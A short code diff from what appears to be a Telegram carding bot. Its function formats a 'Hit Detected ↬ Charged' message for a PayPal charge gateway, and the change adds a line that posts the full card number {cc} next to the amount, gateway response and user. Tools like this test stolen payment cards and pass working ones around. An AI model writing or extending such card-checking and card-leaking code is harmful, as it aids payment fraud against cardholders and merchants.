@@ -164,8 +164,9 @@ def send_hit_detection_message(cc, amount, user_id, user_name, response_text):
         user_mention = f'<a href="tg://user?id={user_id}">{safe_name}</a>'  
           
         hit_message = f"""⩙ 𝑯𝒊𝒕 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 ↬ 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 🔥    
-⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ #Paypal_Charge    
-⊀ 𝐏𝐫𝐢𝐜𝐞 ↬ ${amount}    
+⊀ 𝐂𝐚𝐫𝐝 ↬ {cc}    
+⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ #Paypal_Charge        
+⊀ 𝐏𝐫𝐢𝐜𝐞 ↬ ${amount}
 ⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ {response_text} 🔥    
 ⌬ 𝐔𝐬𝐞𝐫 ↬ {user_id}    
 ⌬ 𝐇𝐢𝐭 𝐅𝐫𝐨𝐦 ↬ {user_mention}"""  
